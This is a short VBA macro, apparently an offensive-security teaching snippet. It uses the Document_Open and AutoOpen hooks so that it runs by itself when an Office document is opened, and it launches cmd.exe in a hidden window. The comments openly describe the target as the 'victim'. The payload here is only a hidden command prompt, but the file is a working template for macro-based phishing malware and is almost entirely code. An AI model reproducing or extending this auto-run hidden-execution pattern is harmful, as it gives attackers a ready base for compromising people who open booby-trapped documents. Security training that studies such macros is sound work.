Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

' Both methods above make the macro run when document gets open. Only one is required for correct performance.

Sub MyMacro()
    Dim str As String ' Defines str as a String variable.
    str = "cmd.exe"
    Shell str, vbHide
End Sub

' This method uses Shell function to run the program located in 'str' path location in a hidden window (vbHide) for victim.